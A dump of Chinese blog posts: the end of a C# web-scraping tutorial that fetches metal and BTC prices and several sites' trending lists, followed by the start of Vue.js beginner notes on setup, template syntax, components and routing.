&#123; ViewBag.Error = &quot;Price cell not found in table row.&quot;; &#125; &#125; else &#123; ViewBag.Error = &quot;Table row not found.&quot;; &#125; 也可以用正则表达式提取 👌前端Price显示123&lt;h1&gt;Au99.99 Price: @ViewBag.Price&lt;/h1&gt;&lt;h2&gt;@ViewBag.Error&lt;/h2&gt; 🌱运行实例 获取金价Au​也可以通过修改规则取实时Pt的价格 1234567891011121314151617181920212223242526272829303132333435363738// 使用XPath表达式选择指定的&lt;tr&gt;元素var trElements = htmlDocument.DocumentNode.SelectNodes(&quot;//tr[contains(@class, &#x27;border_ea&#x27;) and contains(@class, &#x27;noTop_border &#x27;)]&quot;); if (trElements != null)&#123; foreach (var trElement in trElements) &#123; // 获取包含产品名称和价格的&lt;td&gt;元素 var tdElements = trElement.SelectNodes(&quot;./td&quot;); if (tdElements != null &amp;&amp; tdElements.Count &gt;= 5) &#123; // 获取产品名称、最新价、最高价、最低价和今开盘价格 string productName = tdElements[0].InnerText.Trim(); string latestPrice = tdElements[1].InnerText.Trim(); string highestPrice = tdElements[2].InnerText.Trim(); string lowestPrice = tdElements[3].InnerText.Trim(); string openingPrice = tdElements[4].InnerText.Trim(); // 检查产品名称是否为Au99.99或Pt99.95 if (productName == &quot;Au99.99&quot;) &#123; // 将Au99.99价格信息传递给视图 ViewBag.AuLatestPrice = latestPrice; ViewBag.AuHighestPrice = highestPrice; ViewBag.AuLowestPrice = lowestPrice; ViewBag.AuOpeningPrice = openingPrice; &#125; else if (productName == &quot;Pt99.95&quot;) &#123; // 将Pt99.95价格信息传递给视图 ViewBag.PtLatestPrice = latestPrice; ViewBag.PtHighestPrice = highestPrice; ViewBag.PtLowestPrice = lowestPrice; ViewBag.PtOpeningPrice = openingPrice; &#125; &#125; &#125;&#125; 结果如下： ​ 🧾使用正则表达式解析通过httpClient请求 123456789101112131415161718192021222324252627282930313233343536373839public async Task&lt;ActionResult&gt; Index()&#123; // 获取当前时间的时间戳 long timestamp = DateTimeOffset.Now.ToUnixTimeMilliseconds(); // 构建URL string url = $&quot;http://www.xxx.cn/xx.js?t=&#123;timestamp&#125;&quot;; // 创建HttpClient实例 using (var httpClient = new HttpClient()) &#123; // 设置 User-Agent httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent()); try &#123; // 发送GET请求 var response = await httpClient.GetAsync(url); response.EnsureSuccessStatusCode(); // 读取返回的数据 var responseData = await response.Content.ReadAsStringAsync(); // 解析返回的数据 var price = ParseGoldPrice(responseData); // 将价格传递给视图 ViewBag.Price = price; &#125; catch (HttpRequestException ex) &#123; // 处理请求异常 ViewBag.Error = &quot;Failed to retrieve gold price data.&quot;; &#125; &#125; // 返回视图 return View();&#125; 处理返回价格 通过正则表达式匹配数据 123456789101112131415161718192021222324252627282930313233343536373839private decimal ParseGoldPrice(string responseData)&#123; string price = &quot;&quot;; decimal price2 = 0; string data = responseData;// // 匹配价格的正则表达式 string pattern = @&quot;var hq_str_gds_AUTD=&quot;&quot;([^&quot;&quot;]+)&quot;&quot;;&quot;; // 使用正则表达式匹配数据 Match match = Regex.Match(data, pattern); if (match.Success) &#123; // 获取匹配到的价格数据 string priceData = match.Groups[1].Value; // 使用逗号分割数据，取第一个元素作为价格 string[] priceParts = priceData.Split(&#x27;,&#x27;); price = priceParts[0]; // 将字符串价格转换为decimal类型 price2 = decimal.Parse(price); // 输出提取到的价格 Console.WriteLine(&quot;Gold Price: &quot; + price2); &#125; else &#123; Console.WriteLine(&quot;Price not found in data.&quot;); &#125; // decimal price = decimal.Parse(priceString); return price2;&#125; ​ 💫获取BTC价格Headers模拟cookie获取BTC价格 12345678910111213141516171819202122232425262728293031 httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent()); httpClient.DefaultRequestHeaders.Add(&quot;Accept&quot;, &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.9&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Cache-Control&quot;, &quot;max-age=0&quot;);//cookie httpClient.DefaultRequestHeaders.Add(&quot;Cookie&quot;, &quot;__51uvsct__3ExGyQaAoNSqsSUY=1; __51vcke__3ExGyQaAoNSqsSUY=c91184d5-8826-5ea8-8ddc-a0f3b85c9470; __51vuft__3ExGyQaAoNSqsSUY=1713248151570; PHPSESSI328&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Ch-Ua&quot;, &quot;\\&quot;Google Chrome\\&quot;;v=\\&quot;123\\&quot;, \\&quot;Not:A-Brand\\&quot;;v=\\&quot;8\\&quot;, \\&quot;Chromium\\&quot;;v=\\&quot;123\\&quot;&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Ch-Ua-Mobile&quot;, &quot;?0&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Ch-Ua-Platform&quot;, &quot;\\&quot;Windows\\&quot;&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-Dest&quot;, &quot;document&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-Mode&quot;, &quot;navigate&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-Site&quot;, &quot;none&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-User&quot;, &quot;?1&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Upgrade-Insecure-Requests&quot;, &quot;1&quot;); //匹配 var currencyElement = htmlDocument.DocumentNode.SelectSingleNode(&quot;//div[@id=&#x27;hr_app_cid_1&#x27;]&quot;); if (currencyElement != null) &#123; // 查找包含人民币价格的元素 var priceElement = currencyElement.SelectSingleNode(&quot;.//div[@class=&#x27;virtual overflow&#x27;]&quot;); if (priceElement != null) &#123; // 提取人民币价格 var chinesePrice = priceElement.InnerText.Trim(); &#125; &#125; 美元价格也是类似的规则，运行结果 ​ ​ ✨获取CSDN热点​ 模拟请求，修改规则 1234567891011121314151617181920212223242526272829303132333435var httpClient = new HttpClient();var referer = &quot;xxx&quot;;httpClient.DefaultRequestHeaders.Add(&quot;referer&quot;, referer);httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent());var response = await httpClient.GetAsync(&quot;xxx/&quot;);response.EnsureSuccessStatusCode();var responseBody = await response.Content.ReadAsStringAsync(); var contentList = new List&lt;Tuple&lt;string, string, string&gt;&gt;(); var htmlDocument = new HtmlDocument();htmlDocument.LoadHtml(responseBody); // var itemNodes = htmlDocument.DocumentNode.SelectNodes(&quot;//div[contains(@class, &#x27;headswiper-item&#x27;)]&quot;);var items = htmlDocument.DocumentNode.SelectNodes(&quot;//div[@class=&#x27;headswiper-item&#x27;]&quot;); if (items != null)&#123; foreach (var item in items) &#123; var titleNode = item.SelectSingleNode(&quot;.//a[@class=&#x27;title&#x27;]&quot;); var nameNode = item.SelectSingleNode(&quot;.//p[@class=&#x27;name&#x27;]&quot;); var linkNode = item.SelectSingleNode(&quot;.//a[@class=&#x27;title&#x27;]&quot;); if (titleNode != null &amp;&amp; nameNode != null &amp;&amp; linkNode != null) &#123; var title = titleNode.InnerText.Trim(); var name = nameNode.InnerText.Trim(); var link = linkNode.GetAttributeValue(&quot;href&quot;, &quot;&quot;); contentList.Add(new Tuple&lt;string, string, string&gt;(title, name, link)); &#125; &#125;&#125;return View(contentList); or 使用正则 1234567891011121314 // 使用正则表达式匹配所有符合条件的 div 元素内容var regex = new Regex(@&quot;&lt;div class=&quot;&quot;headswiper-item&quot;&quot;(.*?)&lt;/div&gt;&quot;, RegexOptions.Singleline);var matches = regex.Matches(responseBody);foreach (Match match in matches)&#123; //去除Vuehtml string s1temp = match.Groups[1].Value.Trim(); int i1 = s1temp.IndexOf(&quot;&gt;&quot;)+1; int i2 = s1temp.Length - i1 - 1; string hotstr = s1temp.Substring(i1, i2); contentList.Add(hotstr);&#125; 运行结果​ 🎃 获取编程语言排行榜1234567891011var response = await httpClient.GetAsync(&quot;xxx&quot;);response.EnsureSuccessStatusCode();var htmlContent = await response.Content.ReadAsStringAsync(); var htmlDocument = new HtmlDocument();htmlDocument.LoadHtml(htmlContent); // 获取表格内容var table = htmlDocument.DocumentNode.SelectSingleNode(&quot;//table[@class=&#x27;w-min min-w-full table-fixed divide-y-2 divide-gray-200 text-sm dark:divide-gray-700&#x27;]&quot;); ViewBag.TableContent = table?.OuterHtml; ​ 🖥️获取小破站热门1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var httpClient = new HttpClient();var referer = &quot;https://xxx&quot;;httpClient.DefaultRequestHeaders.Add(&quot;Referer&quot;, referer);httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent());var response = await httpClient.GetAsync(&quot;https://xxx&quot;);response.EnsureSuccessStatusCode();var responseBody = await response.Content.ReadAsStringAsync();var jsonRes = Newtonsoft.Json.JsonConvert.DeserializeObject&lt;dynamic&gt;(responseBody);var tempArr = new List&lt;MItem&gt;();int itid = 1;foreach (var itemj in jsonRes.data.list)&#123; string tt = itemj.keyword.ToString(); // string hot = itemj.hot_value.ToString(); tempArr.Add(new MItem &#123; Index = itid++, Title = tt, Hot = &quot;&quot;, Url = &quot;https://search.bilibili.com/all?keyword=&quot; + tt+ &quot;&amp;order=click&quot;, MobileUrl = &quot;https://search.bilibili.com/all?keyword=&quot; + tt+ &quot;&amp;order=click&quot; &#125;);&#125;var md = new MData&#123; Success = true, Title = &quot;小破站&quot;, Subtitle = &quot;热搜榜&quot;, UpdateTime = DateTime.Now.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;), Data = tempArr&#125;; public class MData &#123; public bool Success &#123; get; set; &#125; public string Title &#123; get; set; &#125; public string Subtitle &#123; get; set; &#125; public string UpdateTime &#123; get; set; &#125; public List&lt;MItem&gt; Data &#123; get; set; &#125; &#125;public class MItem &#123; public int Index &#123; get; set; &#125; public string Title &#123; get; set; &#125; public string Hot &#123; get; set; &#125; public string Url &#123; get; set; &#125; public string MobileUrl &#123; get; set; &#125; &#125; ​ ⭐获取某音热门12345678910111213141516171819202122232425262728293031323334353637var httpClient = new HttpClient();var referer = &quot;xxx&quot;;httpClient.DefaultRequestHeaders.Add(&quot;referer&quot;, referer);httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent());var response = await httpClient.GetAsync(&quot;xxx&quot;);response.EnsureSuccessStatusCode();var responseBody = await response.Content.ReadAsStringAsync();var jsonRes = Newtonsoft.Json.JsonConvert.DeserializeObject&lt;dynamic&gt;(responseBody);var tempArr = new List&lt;MItem&gt;(); int itid = 1;foreach (var itemj in jsonRes.word_list)&#123; string tt = itemj.word.ToString(); string hot =itemj.hot_value.ToString(); tempArr.Add(new MItem &#123; Index = itid++, Title = tt, Hot = hot, Url = &quot;https://www.douyin.com/search/&quot; + tt, MobileUrl = &quot;https://www.douyin.com/search/&quot; + tt &#125;); &#125; var douyinData = new MData&#123; Success = true, Title = &quot;某音&quot;, Subtitle = &quot;热搜榜&quot;, UpdateTime = DateTime.Now.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;), Data = tempArr&#125;; ​ 注意：如果目标有IP限制、Cookie、签名等，则需编写相应的对策 。 此外，还可以通过WinFrom WebBowser控件实现加载完DOM再匹配信息实现爬取效果。 这里只做抛砖引玉，请勿使用此技术做违法的事情！！！💀 END","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"vue study","slug":"Vue-Base","date":"2024-04-17T00:59:30.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/17/Vue-Base/","permalink":"https://banjinmei.github.io/2024/04/17/Vue-Base/","excerpt":"","text":"前言Vue.js，这个轻量级且灵活的JavaScript框架，就像一位魔术师，用它的魔法棒将数据和视图巧妙地连接在一起。当数据发生变化时，Vue.js就像变魔术一样，让视图自动更新，为开发者带来了极大的便利。 Vue.js的诞生，源于一位名叫尤雨溪的开发者对前端开发的热爱与追求。在Google工作期间，他受到了Angular的启发，决定开发一款更加轻量、灵活的框架。于是，Vue.js应运而生，它的名字来源于“View”的缩写，寓意着它专注于视图层的开发。Vue.js不断地完善和发展。它引入了响应式数据绑定、组件化开发等核心概念，让前端开发变得更加高效和可维护。 👋 Vue环境搭建首先，搭一个打代码的环境 1.安装node.js在使用VS Code之前，需要安装Vue的开发环境。 安装Vue的最简单方法是使用npm包管理器，先安装Node.js和npm。 node官网 &#x3D;&gt; https://nodejs.org/en/download 2.配置环境变量在nodejs安装目录下新建node_cache（nodejs缓存）、node_global（全局包存放）两个文件夹，如下图所示。 ​​ 打开cmd命令提示符，配置文件路径如下： ​​ 配置环境变量 ​​ 系统属性-&gt;高级-&gt;环境变量-&gt;新增环境变量：​​ 系统变量​​ ​​ 3.VSCode配置 Visual Studio Code 以管理员身份运行VSCode VSCode安装插件ESLint 安装js打包工具 12npm install -g webpack ​​ ​​ 4.安装Vue CLI1234npm install -g vue-cli(vue-cli npm install @vue/cli -g --unsafe-perm) 5.在VS Code中打开Vue项目5.1. 在VS Code中，File &gt; Open Folder… 选择“文件”&gt; “打开文件夹”。​​ 5.2. 找到Vue项目文件夹，选择“文件夹”并打开。​​ 可以根据需要，在Extensions安装VSCode的中文扩展。 5.3也可以通过Vue UI 创建一个新的Vue项目然后打开12vue ui ​​ ​​ 6.运行Vue项目在VS Code中打开 Terminal 终端，切换到Vue项目文件夹，然后运行以下命令： 12npm install ​​ 1install --完会有node_modules 12npm run dev ​​ 1npm run serve 123npm run build ​​ 生成打包完会有dist文件夹放着打包好的文件 可直接放到服务器上运行 另外，也可通过 HBuilder 来敲代码​​ 内置浏览器 👀 Vue基础学习1.引入vue.js 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;script src=&quot;vue.js&quot; type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;div id=&quot;app&quot;&gt; &#123;&#123; message &#125;&#125; &#123;&#123;name&#125;&#125; &#123;&#123;himan&#125;&#125; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; message: &#x27;Hello Vue!&#x27;, name : &quot;Vue&quot;, himan:&quot;hhhhhhh&quot; &#125; &#125;); &lt;/script&gt;​```​​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041746.jpg&quot; &gt;## 2.数据方法 ``` javascript&lt;div id=&quot;app&quot;&gt; &#123;&#123;a&#125;&#125;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt;var data = &#123; a : 1 &#125;;var vm = new Vue(&#123; el : &quot;#app&quot;, data : data&#125;); //data.a = 121212 vm.$watch(&#x27;a&#x27;, function(newVal, oldVal)&#123; console.log(newVal, oldVal);&#125;) vm.$data.a = &quot;123123.&quot; &lt;/script&gt; ​ 3.生命周期每个 Vue 组件实例在创建时都需要经历一系列的初始化步骤，比如设置好数据侦听，编译模板，挂载实例到 DOM，以及在数据改变时更新 DOM。在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。 befroreCreate 在实例初始化之后 数据观测 (data observer) 和 event&#x2F;watcher 事件配置之前被调用。 created 在实例创建完成后被立即调用。 在这一步，实例已完成以下的配置：数据观测 (data observer)，属性和方法的运算，watch&#x2F;event 事件回调。 然而，挂载阶段还没开始，$el 属性目前不可见。 beforeMount 在挂载开始之前被调用 相关的渲染函数首次被调用 mounted 在组件被挂载之后调用 beforeUpdate 数据更新时调用 updated &#x2F;&#x2F;组件 DOM 已经更新, 组件更新完毕 注意：生命周期不能用箭头函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;div id=&quot;app&quot;&gt; &#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; msg : &quot;hi vue&quot;, &#125;, beforeCreate:function()&#123; console.log(&#x27;beforeCreate&#x27;); &#125;, created :function()&#123; console.log(&#x27;created&#x27;); &#125;, beforeMount : function()&#123; console.log(&#x27;beforeMount&#x27;); &#125;, mounted : function()&#123; console.log(&#x27;mounted&#x27;); &#125;, beforeUpdate : function()&#123; console.log(&#x27;beforeUpdate&#x27;); &#125;, updated : function()&#123; console.log(&#x27;updated&#x27;); &#125;&#125;);setTimeout(function()&#123; vm.msg = &quot;change msg&quot;; console.log(&quot;change msg&quot;);&#125;, 10000);​ ​​ 生命周期选项Vue.js &#x3D;&gt; https://cn.vuejs.org/api/options-lifecycle.html 4.模板语法v-bind v-html js表达式 1234567891011121314151617181920212223242526272829303132 &lt;p&gt;&#123;&#123; number + 1 &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; 1 == 1 ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;/p&gt;&lt;div id=&quot;app&quot;&gt; &#123;&#123;msg&#125;&#125; &lt;p&gt;Using mustaches: &#123;&#123; rawHtml &#125;&#125;&lt;/p&gt; &lt;p v-html=&quot;rawHtml&quot;&gt;&lt;/p&gt; &lt;div v-bind:class=&quot;color&quot;&gt;test...&lt;/div&gt; &lt;p&gt;&#123;&#123; number + 1 &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; 1 == 1 ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; msg : &quot;hi vue&quot;, rawHtml : &#x27;&lt;span style=&quot;color:red&quot;&gt;this is should be red&lt;/span&gt;&#x27;, color:&#x27;blue&#x27;, number : 10, ok : 1, message : &quot;vue&quot; &#125;&#125;);vm.msg = &quot;hi....&quot;;&lt;/script&gt; &lt;style type=&quot;text/css&quot;&gt;.red&#123;color:red;&#125;.blue&#123;color:blue; font-size:14px;&#125;&lt;/style&gt; ​​ v-if @clikck @click.stop stop修饰 表示只执行click2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166&lt;div id=&quot;app&quot;&gt; &lt;p v-if=&quot;seen&quot;&gt;HIHI&lt;/p&gt; &lt;a v-bind:href=&quot;url&quot;&gt;...&lt;/a&gt; &lt;div @click=&quot;click1&quot; &gt; &lt;div @click.stop=&quot;click2&quot;&gt; click me &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; seen : false, url : &quot;HTTPS://WWW.BAIDU.COM&quot; &#125;, methods:&#123; click1 : function () &#123; console.log(&#x27;click1......&#x27;); &#125;, click2 : function () &#123; console.log(&#x27;click2......&#x27;); &#125; &#125;&#125;);&lt;/script&gt;​```​​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041749.jpg&quot; &gt;## 5.对象语法class style绑定``` html&lt;div id=&quot;app&quot;&gt; &lt;div class=&quot;test&quot; v-bind:class=&quot;[ isActive ? &#x27;active&#x27; : &#x27;&#x27;, isGreen ? &#x27;green&#x27; : &#x27;&#x27;]&quot; style=&quot;width:200px; height:200px; text-align:center; line-height:200px;&quot;&gt; hahaha &lt;/div&gt; &lt;div :style=&quot;&#123;color:color, fontSize:size, background: isBlue ? &#x27;blue&#x27; : &#x27;&#x27;&#125;&quot;&gt; hihihihi &lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; isActive : true, isGreen : true, color : &quot;#111111&quot;, size : &#x27;50px&#x27;, isRed : true, isBlue:true &#125;&#125;);&lt;/script&gt;&lt;style&gt;.test&#123;font-size:30px;&#125;.green&#123;color:#00FF00;&#125;.active&#123;background:gray;&#125;&lt;/style&gt;​```[2024041750]## 6.条件渲染v-if v-show ``` javascript&lt;div id=&quot;app&quot;&gt; &lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt; A &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt; &lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt; &lt;h1 v-show=&quot;nok&quot;&gt;Hello!&lt;/h1&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; type : &quot;D&quot;, ok : true//ok : false &#125;&#125;);&lt;/script&gt;​```​​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041751.jpg&quot; &gt;如果需要频繁切换 ，用v-show show有写入dom## 7.列表渲染v-for ``` javascript&lt;div id=&quot;app&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;item,index in items&quot; :key=&quot;index&quot;&gt; &#123;&#123;index + 1 &#125;&#125; &#123;&#123; item.message &#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;ul&gt; &lt;li v-for=&quot;value, key in object&quot;&gt; &#123;&#123;key&#125;&#125; : &#123;&#123; value &#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; items : [ &#123; message: &#x27;zhangsan&#x27; &#125;, &#123; message: &#x27;liwu&#x27; &#125; ], object: &#123; title: &#x27;tt&#x27;, author: &#x27;zhangsan&#x27;, createAt: &#x27;2024-01-01&#x27; &#125; &#125;&#125;);&lt;/script&gt;​```​​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041752.jpg&quot; &gt;## 8.事件 ``` html &lt;div id=&quot;app&quot;&gt; &lt;div id=&quot;example-1&quot;&gt; &lt;button v-on:click=&quot;counter+=1&quot;&gt;数值: &#123;&#123; counter &#125;&#125;&lt;/button&gt;&lt;br /&gt; &lt;button v-on:click=&quot;greet(&#x27;abc&#x27;)&quot;&gt;Greet&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var vm = new Vue(&#123; el :&quot;#app&quot; data :&#123; counter:0, name :&quot;vue&quot; &#125;, methods:&#123; greet :function(str,e)&#123; alert(&#x27;hi&#x27;); alert(this.name);&#125; &#125;); &lt;/script&gt; ​​ 9.表单绑定 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;div id=&quot;app&quot;&gt; &lt;div id=&quot;example-1&quot;&gt; &lt;input v-model=&quot;message&quot; placeholder=&quot;edit me&quot;&gt; &lt;p&gt;Message is: &#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;textarea v-model=&quot;message2&quot; placeholder=&quot;add multiple lines&quot;&gt;&lt;/textarea&gt; &lt;p style=&quot;white-space: pre-line;&quot;&gt;&#123;&#123; message2 &#125;&#125;&lt;/p&gt; &lt;br /&gt; &lt;div style=&quot;margin-top:20px;&quot;&gt; &lt;input type=&quot;checkbox&quot; id=&quot;z&quot; value=&quot;z&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;z&quot;&gt;z&lt;/label&gt; &lt;input type=&quot;checkbox&quot; id=&quot;x&quot; value=&quot;x&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;x&quot;&gt;x&lt;/label&gt; &lt;input type=&quot;checkbox&quot; id=&quot;a&quot; value=&quot;a&quot; v-model=&quot;checkedNames&quot;&gt; &lt;label for=&quot;a&quot;&gt;a&lt;/label&gt; &lt;br&gt; &lt;span&gt;Checked names: &#123;&#123; checkedNames &#125;&#125;&lt;/span&gt; &lt;/div&gt; &lt;div style=&quot;margin-top:20px;&quot;&gt; &lt;input type=&quot;radio&quot; id=&quot;one&quot; value=&quot;One&quot; v-model=&quot;picked&quot;&gt; &lt;label for=&quot;one&quot;&gt;One&lt;/label&gt; &lt;br&gt; &lt;input type=&quot;radio&quot; id=&quot;two&quot; value=&quot;Two&quot; v-model=&quot;picked&quot;&gt; &lt;label for=&quot;two&quot;&gt;Two&lt;/label&gt; &lt;br&gt; &lt;span&gt;Picked: &#123;&#123; picked &#125;&#125;&lt;/span&gt; &lt;/div&gt; &lt;button type=&quot;button&quot; @click=&quot;submit&quot;&gt;提交&lt;/button&gt; &lt;/div&gt; &lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; message : &quot;himsg&quot;, message2 :&quot;himsg2&quot;, checkedNames : [&#x27;a&#x27;, &#x27;z&#x27;], picked : &quot;Two&quot; &#125;, methods: &#123; submit : function () &#123; console.log(this.message + &quot; &quot;+this.message2 ); &#125; &#125;&#125;);&lt;/script&gt;​```​​&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041754.jpg&quot; &gt;## 10.组件基础 ``` javascript&lt;div id=&quot;app&quot;&gt; &lt;button-counter title=&quot;123&quot;&gt;&lt;/button-counter&gt; &lt;button-counter title=&quot;title1 &quot; @clicknow=&quot;clicknow&quot;&gt; &lt;h3&gt;hi...h3&lt;/h3&gt; &lt;/button-counter&gt; &lt;button-counter title=&quot;title2 : &quot;&gt;&lt;/button-counter&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; Vue.component(&#x27;button-counter&#x27;, &#123; props: [&#x27;title&#x27;], data: function() &#123; return &#123; count: 0 &#125; &#125;, template: &#x27;&lt;div&gt;&lt;h1&gt;hi...&lt;/h1&gt;&lt;button v-on:click=&quot;clickfun&quot;&gt;&#123;&#123;title&#125;&#125; You clicked me &#123;&#123; count &#125;&#125; times.&lt;/button&gt;&lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&#x27;, methods: &#123; clickfun: function() &#123; this.count++; this.$emit(&#x27;clicknow&#x27;, this.count);//传出去 &#125; &#125; &#125;) var vm = new Vue(&#123; el: &quot;#app&quot;, data: &#123; &#125;, methods: &#123; clicknow: function(e) &#123; console.log(e); &#125;, &#125; &#125;); &lt;/script&gt; component(‘xxx’,{}) xxx组件名称 {}对象内容 props:[“title”]定义属性 插槽 可插入html标签 12345678910111213141516171819202122232425262728&lt;script type=&quot;text/javascript&quot;&gt;Vue.component(&#x27;button-counter&#x27;, &#123; props: [&#x27;title&#x27;], data: function () &#123; return &#123;&#125; &#125;, template: &#x27;&lt;div&gt;&lt;h1&gt;hi...&lt;/h1&gt;&lt;/div&gt;&#x27;, methods:&#123; &#125;&#125;)var vm = new Vue(&#123; el : &quot;#app&quot;, data : &#123; &#125;, methods:&#123; clicknow : function (e) &#123; console.log(e); &#125; &#125;, components:&#123; test : &#123; template:&quot;&lt;h2&gt;h2...&lt;/h2&gt;&quot; &#125; &#125;&#125;);&lt;/script&gt; Vue.component(‘button-counter’…是全局注册 components:{… } 局部注册 11.单文件组件​​ 123456789101112131415161718192021222324&lt;template&gt; &lt;div&gt; &lt;h1&gt;Hello, Vue!&lt;/h1&gt; &lt;HelloWorld /&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;// 引入 HelloWorld 组件import HelloWorld from &#x27;./HelloWorld.vue&#x27;; export default &#123; name: &#x27;App&#x27;, components: &#123; // 注册引入的组件 HelloWorld &#125;&#125;&lt;/script&gt; &lt;style&gt;/* 样式 */&lt;/style&gt; 🌱Vue组件学习Vue RouterVue Router 是 Vue.js 官方的路由管理器。它允许构建单页应用（SPA），在不同的 URL 之间进行导航，同时还可以实现诸如路由参数、嵌套路由、路由导航守卫等功能。 1.安装 Vue Router1npm install vue-router 2.router.jsVue 项目中，需要创建一个路由实例并将其挂载到 Vue 实例上。通常情况下，名为 router.js 或者类似的文件中定义路由，然后在主 Vue 实例中引入它。 12345678910111213141516171819// router/index.jsimport &#123; createRouter, createWebHistory &#125; from &#x27;vue-router&#x27;import Login from &#x27;../components/Login.vue&#x27;import Setting from &#x27;../components/Setting.vue&#x27;import UserManagement from &#x27;../components/UserManagement.vue&#x27;import imtest from &#x27;../components/WebIMTest.vue&#x27;const routes = [ &#123; path: &#x27;/Login&#x27;, component: Login &#125;, // _ // 设置空默认路由为Login.vue &#123; path: &#x27;/Setting&#x27;, component: Setting &#125;, &#123; path: &#x27;/UserManagement&#x27;, component: UserManagement &#125;, &#123; path: &#x27;/imtest&#x27;, component: imtest &#125;] const router = createRouter(&#123; history: createWebHistory(), routes&#125;) export default router createRouter 函数用于创建路由实例，而 createWebHistory 函数则用于创建基于 HTML5 History API 的路由模式，也就是使用浏览器的 History API 来处理 URL 的变化 3.引入路由实例Vue 实例中，需要引入这个路由实例，并将其应用到 Vue 实例中。 123456789101112// main.js import Vue from &#x27;vue&#x27;;import App from 